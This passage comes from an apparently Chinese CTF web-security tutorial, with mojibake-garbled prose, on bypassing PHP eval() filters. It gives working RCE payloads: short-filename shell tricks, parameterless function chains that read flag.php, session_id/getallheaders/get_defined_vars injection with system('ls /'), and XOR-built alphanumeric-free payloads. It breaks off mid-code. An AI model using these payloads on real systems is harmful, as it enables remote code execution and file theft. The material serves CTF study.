ï¼ŒLinuxä¼šæŠŠç¬¬ä¸€ä¸ªåˆ—å‡ºçš„æ–‡ä»¶åå½“ä½œå‘½ä»¤ï¼Œå‰©ä¸‹çš„æ–‡ä»¶åå½“ä½œå‚æ•°</strong></p><p><img src="/img/1722310534824-7.png" alt="img"></p><p>2ï¼šå¢åŠ å­—æ¯æ¥é™å®šè¢«ç”¨æ¥å½“ä½œå‘½ä»¤å’Œå‚æ•°çš„æ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;ls</span><br><span class="line">&gt;lss</span><br><span class="line">&gt;lsss</span><br><span class="line">&gt;<span class="number">1</span></span><br><span class="line">*<span class="title function_ invoke__">s</span>       (ç­‰åŒäºå‘½ä»¤ï¼š ls lss lsss)</span><br></pre></td></tr></table></figure><p><img src="/img/1722310534824-8.png" alt="img"></p><p>3:é€šè¿‡revæ¥å€’ç½®è¾“å‡ºå†…å®¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;rev</span><br><span class="line"><span class="keyword">echo</span> <span class="number">1234</span> &gt; v</span><br><span class="line">*v    ï¼ˆç­‰åŒäºå‘½ä»¤ï¼šrev vï¼‰</span><br></pre></td></tr></table></figure><p>4ï¼šé€šè¿‡å¢åŠ lsçš„-hï¼ˆæŠŠæ–‡ä»¶å¤§å°æ˜¾ç¤ºæˆ1k 1M ç­‰å½¢å¼ï¼‰å‚æ•°æ¥è®©è°ƒæ•´-tï¼ˆæ ¹æ®æ—¶é—´æ’åºï¼‰å‚æ•°çš„ä½ç½® æˆ‘ä»¬ä¹‹åéœ€è¦ç”¨åˆ°rev å€’ç½®è¾“å‡º</p><p>æ‰€ä»¥éœ€è¦åˆ—å‡ºè¿™æ ·å½¢å¼çš„æ–‡ä»¶å</p><p>0&gt;  t-  sl      </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;<span class="number">0</span>\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p><img src="/img/1722310534825-9.png" alt="img"></p><p>ä½†æ˜¯è¾“å‡ºæœ‰ç‚¹ä¸å°½äººæ„ï¼Œè¿™é‡Œéœ€è¦ä½¿ç”¨-hæ¥ä½¿tå¾€å‰æ‹‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;<span class="number">0</span>\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p><img src="/img/1722310534825-10.png" alt="img"></p><p>5ï¼šç”¨diræ¥ä»£æ›¿lsä¸æ¢è¡Œè¾“å‡º</p><p><img src="/img/1722310534825-11.png" alt="img"></p><p>æœ€åæ„å»ºpayload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v        (ç­‰åŒäºå‘½ä»¤ï¼šdir &quot;f&gt;&quot; &quot;ht-&quot; &quot;sl&quot; &gt; v)</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;0        (ç­‰åŒäºå‘½ä»¤ï¼šrev v &gt; 0)(0é‡Œé¢çš„å†…å®¹ä½:ls -th &gt;f)</span><br><span class="line">sh 0        (shæ‰§è¡Œ0é‡Œé¢çš„å†…å®¹)</span><br></pre></td></tr></table></figure><h4 id="æ— å‚æ•°RCEç»•è¿‡"><a href="#æ— å‚æ•°RCEç»•è¿‡" class="headerlink" title="æ— å‚æ•°RCEç»•è¿‡"></a>æ— å‚æ•°RCEç»•è¿‡</h4><p>é¢˜ç›®ç‰¹å¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¡¨è¾¾å¼ [^\W]+((?R)?) åŒ¹é…äº†ä¸€ä¸ªæˆ–å¤šä¸ªéæ ‡ç‚¹ç¬¦å·å­—ç¬¦ï¼ˆè¡¨ç¤ºå‡½æ•°åï¼‰ï¼Œåè·Ÿä¸€ä¸ªæ‹¬å·ï¼ˆè¡¨ç¤ºå‡½æ•°è°ƒç”¨ï¼‰ã€‚å…¶ä¸­ (?R) æ˜¯é€’å½’å¼•ç”¨ï¼Œå®ƒåªèƒ½åŒ¹é…å’Œæ›¿æ¢åµŒå¥—çš„å‡½æ•°è°ƒç”¨ï¼Œè€Œä¸èƒ½å¤„ç†å‡½æ•°å‚æ•°ã€‚ä½¿ç”¨è¯¥æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œæ›¿æ¢åï¼Œæ¯ä¸ªå‡½æ•°è°ƒç”¨éƒ½ä¼šè¢«åˆ é™¤ï¼Œåªå‰©ä¸‹ä¸€ä¸ªåˆ†å· ;ï¼Œè€Œæœ€ç»ˆç»“æœå¼ºç­‰äºï¼›æ—¶ï¼Œpayloadæ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥ã€‚</p><p>ç›¸å…³å‡½æ•°ä»‹ç»</p><p>scandir() :å°†è¿”å›å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•çš„åˆ—è¡¨ã€‚è¿”å›çš„ç»“æœæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•åç§°ï¼ˆglob()å¯æ›¿æ¢ï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">è¾“å‡ºç»“æœ</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; .</span><br><span class="line">    [<span class="number">1</span>] =&gt; ..</span><br><span class="line">    [<span class="number">2</span>] =&gt; .idea</span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="number">1</span>.php</span><br><span class="line">    [<span class="number">4</span>] =&gt; NISACTF.php</span><br><span class="line">    [<span class="number">5</span>] =&gt; test.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><a href="https://so.csdn.net/so/search?q=getcwd&spm=1001.2101.3001.7020">getcwd</a>() :å–å¾—å½“å‰å·¥ä½œç›®å½•</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(getcwd());</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">#D:\web\study-test</span></span><br></pre></td></tr></table></figure><p>current() ï¼šè¿”å›æ•°ç»„ä¸­çš„å•å…ƒï¼Œé»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼</p><p>next()ï¼šè¿”å›æ•°ç»„ä¸­çš„å•å…ƒï¼Œé»˜è®¤å–ç¬¬äºŒä¸ªå€¼</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>];</span><br><span class="line">print_r(<span class="built_in">next</span>($a));</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">&lt;?php</span><br><span class="line">$a = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>];</span><br><span class="line">print_r(current($a));</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">#4</span></span><br></pre></td></tr></table></figure><p>array_flip() :äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼ï¼ŒæˆåŠŸæ—¶è¿”å›äº¤æ¢åçš„æ•°ç»„ array_rand() :ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ</p><p>array_reverse():å°†æ•°ç»„å†…å®¹åè½¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#array_flip():å°†é”®åå€¼è¿›è¡Œå¯¹è°ƒ</span></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">4</span>] =&gt; <span class="number">0</span></span><br><span class="line">    [<span class="number">5</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">7</span>] =&gt; <span class="number">2</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#array_reverse()</span></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">7</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">5</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">4</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">#array_rand</span></span><br><span class="line">&lt;?php</span><br><span class="line">$a = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>];</span><br><span class="line">print_r(array_rand($a));</span><br><span class="line">?&gt;</span><br><span class="line"><span class="comment">#1æˆ–2æˆ–0</span></span><br></pre></td></tr></table></figure><p>localeconv() ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚ï¼ˆä½†æ˜¯è¿™é‡Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯â€˜.â€™ï¼Œè¿™ä¸ª.çš„ç”¨å¤„å¾ˆå¤§ï¼‰</p><p>strrev():ç”¨äºåè½¬ç»™å®šå­—ç¬¦ä¸²ã€‚</p><p>dirname() ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚ chdir() ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚</p><p>ä¾‹é¢˜ï¼š[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</p><p>dirmapæ‰«æï¼Œå‘ç°.gitæ³„éœ²</p><p><img src="/img/1722310534825-12.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://c9a8fee7-08d6-42c9-acc9-423dfb35eafb.node5.buuoj.cn:<span class="number">81</span>/.git/</span><br></pre></td></tr></table></figure><p><img src="/img/1722310534825-13.png" alt="img"></p><p>å‘ç°index.php,å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="scandir-è¯»å–"><a href="#scandir-è¯»å–" class="headerlink" title="scandir()è¯»å–"></a>scandir()è¯»å–</h5><p>1ï¼šbpæŠ“åŒ…ï¼Œ?exp&#x3D;var_dump(localeconv());è¿™é‡Œæˆ‘ä»¬èƒ½çœ‹è§ç¬¬ä¸€ä¸ªstring[1]å°±æ˜¯ä¸€ä¸ªâ€œ.â€ï¼Œè¿™ä¸ªç‚¹æ˜¯ç”±localeconv()äº§ç”Ÿçš„</p><p><img src="/img/1722310534826-14.png" alt="img"></p><p>2ï¼šåˆ©ç”¨<code>current()</code>å‡½æ•°å°†è¿™ä¸ªç‚¹å–å‡ºæ¥çš„ï¼Œ<code>â€˜.â€™</code>ä»£è¡¨çš„æ˜¯å½“å‰ç›®å½•</p><p><img src="/img/1722310534826-15.png" alt="img"></p><p>3ï¼šæ—¢ç„¶current()å–ç¬¬ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆcurrent(localeconv())æ„é€ ä¸€ä¸ª<code>â€˜.â€™,</code><strong><code>è€Œ</code></strong><code>&#39;.&#39;</code> è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œ<code>scandir(&#39;.&#39;)</code> å°†è¿”å›å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶å’Œå­ç›®å½•ï¼Œè¿™é‡Œæˆ‘ä»¬å¾—çŸ¥flagæ‰€åœ¨çš„æ–‡ä»¶åå°±æ˜¯flag.php</p><p><img src="/img/1722310534826-16.png" alt="img"></p><p>4ã€ç„¶è€Œflagçš„æ–‡ä»¶ååœ¨æ¯”è¾ƒåç«¯æˆ‘ä»¬å¯ä»¥é€šè¿‡array_reverse()å°†æ•°ç»„å†…å®¹åè½¬ï¼Œè®©å®ƒä»å€’æ•°ç¬¬äºŒçš„ä½ç½®å˜æˆæ­£æ•°ç¬¬äºŒ</p><p><img src="/img/1722310534826-17.png" alt="img"></p><p>5ï¼šæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥é€‰æ‹©next()å‡½æ•°æ¥è¯»å–flag.php</p><p><img src="/img/1722310534826-18.png" alt="img"></p><p>6:ä½¿ç”¨highlight_fileæ¥è¯»å–æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(<span class="built_in">next</span>(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p><img src="/img/1722310534826-19.png" alt="img"></p><h5 id="session-id-è¯»å–"><a href="#session-id-è¯»å–" class="headerlink" title="session_id()è¯»å–"></a>session_id()è¯»å–</h5><h6 id="hex2binï¼ˆï¼‰è¯»å–"><a href="#hex2binï¼ˆï¼‰è¯»å–" class="headerlink" title="hex2binï¼ˆï¼‰è¯»å–"></a>hex2binï¼ˆï¼‰è¯»å–</h6><p>å¯¹æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤è¿›è¡Œ16è¿›åˆ¶ç¼–ç ï¼Œé€šè¿‡åœ¨<strong>Cookie: PHPSESSID&#x3D;â€â€</strong> æ·»åŠ è‡ªå·±æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤</p><p>æœ€ååœ¨ä½¿ç”¨hexbin()è¿›è¡Œè§£ç å°±è¡Œï¼Œä»è€Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?å‚æ•°=<span class="built_in">eval</span>(hex2bin(session_id(session_start())));</span><br></pre></td></tr></table></figure><h6 id="ç›´æ¥è¯»å–"><a href="#ç›´æ¥è¯»å–" class="headerlink" title="ç›´æ¥è¯»å–"></a>ç›´æ¥è¯»å–</h6><p>è¿˜æ˜¯ä»¥ä¸Šé¢˜ä¸ºä¾‹ï¼Œå‡å¦‚æˆ‘ä»¬çŸ¥é“flag.phpçš„æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬ç›´æ¥è¯»æ–‡ä»¶</p><p>æ·»åŠ ï¼š<strong>Cookie: PHPSESSID&#x3D;flag.php</strong></p><p><img src="/img/1722310534826-20.png" alt="img"></p><h5 id="getallheaders-è¯»å–"><a href="#getallheaders-è¯»å–" class="headerlink" title="getallheaders()è¯»å–"></a>getallheaders()è¯»å–</h5><p>getallheaders()è¿”å›å½“å‰è¯·æ±‚çš„æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯ï¼Œå±€é™äºApacheï¼ˆapache_request_headers()å’Œgetallheaders()åŠŸèƒ½ç›¸ä¼¼ï¼Œå¯äº’ç›¸æ›¿ä»£ï¼Œä¸è¿‡ä¹Ÿæ˜¯å±€é™äºApacheï¼‰</p><p>å½“ç¡®å®šèƒ½å¤Ÿè¿”å›æ—¶ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨æ•°æ®åŒ…æœ€åä¸€è¡ŒåŠ ä¸Šä¸€ä¸ªè¯·æ±‚å¤´ï¼Œå†™å…¥æ¶æ„ä»£ç ï¼Œå†ç”¨end()å‡½æ•°æŒ‡å‘æœ€åä¸€ä¸ªè¯·æ±‚å¤´ï¼Œä½¿å…¶æ‰§è¡Œï¼Œpayloadï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?code=var_dump(end(getallheaders()));    <span class="comment">#print_r,echo</span></span><br></pre></td></tr></table></figure><p><img src="/img/1722310534826-21.png" alt="img"></p><p>skyæ˜¯è‡ªå·±æ·»åŠ çš„è¯·æ±‚å¤´ï¼Œ end()æŒ‡å‘æœ€åä¸€è¡Œçš„skyåçš„ä»£ç ï¼Œè¾¾åˆ°phpinfoçš„ç›®çš„ï¼Œç„¶åå¯ä»¥è¿›ä¸€æ­¥å»rce</p><h5 id="get-defined-vars-è¯»å–"><a href="#get-defined-vars-è¯»å–" class="headerlink" title="get_defined_vars()è¯»å–"></a>get_defined_vars()è¯»å–</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºå…¶è¿”å›çš„æ•°ç»„ç±»å‹çš„å…ˆåé¡ºåºä¸º$_GETâ€“&gt;$_POSTâ€“&gt;$_COOKIEâ€“&gt;$_FILES</p><p><img src="/img/1722310534826-22.png" alt="img"></p><p>å³æˆ‘ä»¬å¯ä»¥å¤šåŠ ä¸€ä¸ªå‚æ•°æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå³æ‰§è¡Œåé¢çš„æ¶æ„è¯­å¥ï¼Œä¾‹å­å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;b=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /&#x27;</span>);</span><br></pre></td></tr></table></figure><h5 id="chdir-array-rand-è¯»å–"><a href="#chdir-array-rand-è¯»å–" class="headerlink" title="chdir()&amp;array_rand()è¯»å–"></a>chdir()&amp;array_rand()è¯»å–</h5><p>å®åœ¨æ— æ³•rceï¼Œå¯ä»¥è¿›è¡Œç›®å½•éå†</p><p>ç»“åˆdirname()åˆ—å‡ºå½“å‰å·¥ä½œç›®å½•çš„çˆ¶ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¯»æ ¹ç›®å½•:</p><p>ord() å‡½æ•°å’Œ chr() å‡½æ•°ï¼šåªèƒ½å¯¹ç¬¬ä¸€ä¸ªå­—ç¬¦è¿›è¡Œè½¬ç ï¼Œord() ç¼–ç ï¼Œchr()è§£ç ï¼Œæœ‰æ¦‚ç‡ä¼šè§£ç å‡ºæ–œæ è¯»å–æ ¹ç›®å½•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#print_r(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array() )))))))))));</span></span><br><span class="line"><span class="comment">#å¯ä»¥æµ‹è¯•ä¸€ä¸‹ï¼Œæœ‰å‡ ç‡è¯»å‡ºæ ¹ç›®å½•ï¼Œæœ¬äººäº²æµ‹</span></span><br></pre></td></tr></table></figure><p>è¯»ä¸Šä¸€çº§æ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())))))));</span><br><span class="line"></span><br><span class="line">?code=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">getcwd</span>())))))))))));</span><br><span class="line"></span><br><span class="line">?code=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">phpversion</span>())))))))))))))));</span><br><span class="line"></span><br><span class="line">å¯ä»¥å°†show_sourceæ¢æˆprint_r,å»ºè®®ä½¿ç”¨ç¬¬ä¸€ä¸ª</span><br></pre></td></tr></table></figure><h4 id="æ— å­—æ¯æ•°å­—çš„ç»•è¿‡"><a href="#æ— å­—æ¯æ•°å­—çš„ç»•è¿‡" class="headerlink" title="æ— å­—æ¯æ•°å­—çš„ç»•è¿‡"></a>æ— å­—æ¯æ•°å­—çš„ç»•è¿‡</h4><h5 id="å¼‚æˆ–ç»•è¿‡"><a href="#å¼‚æˆ–ç»•è¿‡" class="headerlink" title="å¼‚æˆ–ç»•è¿‡"></a>å¼‚æˆ–ç»•è¿‡</h5><p><strong>[HUBUCTF 2022 æ–°ç”Ÿèµ›]HowToGetShell</strong></p><p>æ¶‰åŠçŸ¥è¯†ç‚¹ï¼šæ— å­—æ¯RCE-å¼‚æˆ–ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$mess=$_POST[<span class="string">&#x27;mess&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-zA-Z]/&quot;</span>,$mess))&#123;</span><br><span class="line">    die(<span class="string">&quot;invalid input!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">eval</span>($mess);</span><br><span class="line"><span class="comment">#è¿‡æ»¤äº†æ‰€æœ‰å¤§å°å†™å­—æ¯</span></span><br><span class="line"><span class="comment">#è¿™é‡Œé‡‡ç”¨å¼‚æˆ–ç»•è¿‡</span></span><br><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class="line"></span><br><span class="line">answer = <span class="string">&quot;phpinfo&quot;</span></span><br><span class="line"></span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(tmp1)  <span class="comment"># 0302181</span></span><br><span class="line"><span class="built_in">print</span>(tmp2)  <span class="comment"># @[@[_^^</span></span><br><span class="line"><span class="comment">#payload: mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_();</span></span><br></pre></td></tr></table></figure><h5 id="è‡ªå¢ç»•è¿‡"><a href="#è‡ªå¢ç»•è¿‡" class="headerlink" title="è‡ªå¢ç»•è¿‡"></a>è‡ªå¢ç»•è¿‡</h5><p>ç®€ä»‹ï¼š</p><p>è‡ªå¢ï¼ˆIncrementï¼‰é€šå¸¸æŒ‡çš„æ˜¯å°†æŸä¸ªå€¼å¢åŠ ä¸€ä¸ªå›ºå®šçš„å¢é‡ã€‚åœ¨ç¼–ç¨‹ä¸­ï¼Œè‡ªå¢é€šå¸¸ç”¨äºå¾ªç¯è®¡æ•°ã€è¿­ä»£æˆ–è€…æ›´æ–°å˜é‡çš„å€¼ç­‰æƒ…å†µã€‚</p><p><strong>[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce_3</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]; </span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\|&#x27;</span>]; </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å°ä¼™å­åªä¼šå¼‚æˆ–å’Œå–åï¼Ÿä¸å¥½æ„æ€å“¦LTLTè¯´ä¸èƒ½ç”¨ï¼ï¼&quot;</span>); </span><br><span class="line">    &#125;&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9]/is&#x27;</span>,<span 